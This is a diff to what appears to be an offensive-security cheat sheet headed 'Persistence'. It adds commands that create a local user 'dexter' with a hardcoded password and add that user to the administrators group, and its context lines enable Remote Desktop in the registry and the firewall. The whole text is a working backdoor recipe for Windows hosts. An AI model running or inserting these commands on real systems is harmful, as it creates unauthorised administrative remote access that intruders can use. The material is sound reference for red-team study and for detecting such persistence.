@@ -1,6 +1,9 @@
 # Persistence
 
 ```powershell
+net user /add dexter @Password123
+net localgroup administrators dexter /add
+
 Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\' -Name "fDenyTSConnections" -Value 0
 
 Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
